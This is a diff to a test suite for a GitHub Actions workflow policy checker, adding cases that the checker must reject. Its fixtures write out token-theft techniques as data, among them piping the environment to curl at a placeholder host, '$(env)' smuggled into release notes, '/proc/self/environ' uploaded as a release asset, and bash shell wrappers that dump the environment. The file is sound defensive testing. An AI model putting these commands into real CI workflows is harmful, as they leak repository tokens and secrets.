@@ -86,6 +86,9 @@ jobs:
       - run: echo verified
 `;
 
+const validReleaseCommand =
+  'gh release create "${{ github.ref_name }}" --verify-tag';
+
 const validFutureReleaseWorkflow = `name: Release
 
 on:
@@ -112,7 +115,7 @@ jobs:
       - name: Create the verified GitHub release
         env:
           GH_TOKEN: \${{ github.token }}
-        run: gh release create v1.0.0 package.tgz --verify-tag
+        run: ${validReleaseCommand}
   npm-publish:
     if: \${{ inputs.publish_npm }}
     needs: release
@@ -294,6 +297,10 @@ describe("GitHub workflow policy", () => {
     {
       name: "the bare complete GitHub context",
       expression: "${{ github }}",
+    },
+    {
+      name: "a GitHub object filter serialized as JSON",
+      expression: "${{ toJSON(github.*) }}",
     },
   ])("rejects $name in a non-release workflow", async ({ expression }) => {
     await withPolicyFixture(async (fixtureRoot) => {
@@ -490,21 +497,31 @@ describe("GitHub workflow policy", () => {
   it.each([
     {
       name: "a second shell command",
-      run: "gh release create v1.0.0 package.tgz --verify-tag && env",
+      run: `${validReleaseCommand} && env`,
     },
     {
       name: "a multiline exfiltration command",
       run: `|
-          gh release create v1.0.0 package.tgz --verify-tag
+          ${validReleaseCommand}
           env | curl --data-binary @- https://example.invalid`,
     },
     {
       name: "a pipe",
-      run: "gh release create v1.0.0 package.tgz --verify-tag | tee release.log",
+      run: `${validReleaseCommand} | tee release.log`,
     },
     {
       name: "a command substitution",
-      run: 'gh release create v1.0.0 package.tgz --notes "$(env)" --verify-tag',
+      run: validReleaseCommand.replace(
+        "--verify-tag",
+        '--notes "$(env)" --verify-tag',
+      ),
+    },
+    {
+      name: "/proc/self/environ as a release asset",
+      run: validReleaseCommand.replace(
+        "--verify-tag",
+        "/proc/self/environ --verify-tag",
+      ),
     },
   ])("rejects GH_TOKEN beside $name", async ({ run }) => {
     await withPolicyFixture(async (fixtureRoot) => {
@@ -512,7 +529,7 @@ describe("GitHub workflow policy", () => {
         fixtureRoot,
         "release.yml",
         validFutureReleaseWorkflow.replace(
-          "run: gh release create v1.0.0 package.tgz --verify-tag",
+          `run: ${validReleaseCommand}`,
           `run: ${run}`,
         ),
       );
@@ -525,9 +542,9 @@ describe("GitHub workflow policy", () => {
   it.each([
     {
       name: "a custom shell wrapper",
-      before: "        run: gh release create v1.0.0 package.tgz --verify-tag",
-      after:
-        "        shell: bash -c 'env; {0}'\n        run: gh release create v1.0.0 package.tgz --verify-tag",
+      before: `        run: ${validReleaseCommand}`,
+      after: `        shell: bash -c 'env; {0}'
+        run: ${validReleaseCommand}`,
     },
     {
       name: "a shell startup environment hook",
@@ -545,6 +562,26 @@ describe("GitHub workflow policy", () => {
 
       const stderr = await verifierFailure(fixtureRoot);
       expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
+    });
+  });
+
+  it("rejects release job defaults.run.shell wrappers", async () => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(
+          "    runs-on: ubuntu-latest\n",
+          `    runs-on: ubuntu-latest
+    defaults:
+      run:
+        shell: bash -c 'env; {0}'
+`,
+        ),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(RELEASE_SHELL_POLICY)");
     });
   });
 
@@ -645,6 +682,40 @@ describe("GitHub workflow policy", () => {
 
       const stderr = await verifierFailure(fixtureRoot);
       expect(stderr).toContain("(PACKAGE_MATRIX_SHAPE)");
+    });
+  });
+
+  it.each([
+    {
+      name: "a job-level if expression",
+      before: "    timeout-minutes: 25\n",
+      after: "    timeout-minutes: 25\n    if: ${{ false }}\n",
+    },
+    {
+      name: "job-level continue-on-error set to false",
+      before: "    timeout-minutes: 25\n",
+      after: "    timeout-minutes: 25\n    continue-on-error: false\n",
+    },
+    {
+      name: "a required-step if set to false",
+      before: "        run: npm run package:verify\n",
+      after: "        if: false\n        run: npm run package:verify\n",
+    },
+    {
+      name: "a required-step continue-on-error expression",
+      before: "        run: npm run package:verify\n",
+      after:
+        "        continue-on-error: ${{ false }}\n        run: npm run package:verify\n",
+    },
+  ])("rejects package smoke with $name", async ({ before, after }) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      const target = resolve(fixtureRoot, workflowPaths[1]);
+      const source = await readFile(target, "utf8");
+      expect(source).toContain(before);
+      await writeFile(target, source.replace(before, after), "utf8");
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(PACKAGE_EXECUTION_POLICY)");
     });
   });
 
